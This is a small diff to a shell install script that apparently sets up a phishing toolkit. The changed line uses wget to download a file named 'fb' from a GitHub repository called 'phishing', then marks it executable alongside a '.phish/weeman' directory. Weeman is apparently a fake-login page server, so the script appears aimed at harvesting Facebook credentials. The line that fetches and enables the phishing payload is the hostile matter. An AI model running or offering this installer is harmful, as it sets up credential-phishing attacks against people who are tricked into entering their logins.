@@ -31,9 +31,7 @@ echo -e "\033[1m \e[32m Cloning Completed"
 
 echo -e "\033[1m \e[32m Giving Final Touchup"
 
-cd $HOME && chmod +x fb
-
-wget https://raw.githubusercontent.com/Unknown2x/phishing/mast
+cd $HOME && wget https://raw.githubusercontent.com/Unknown2x/phishing/master/fb && chmod +x *
 
 cd $HOME/.phish/weeman && chmod +x *
 
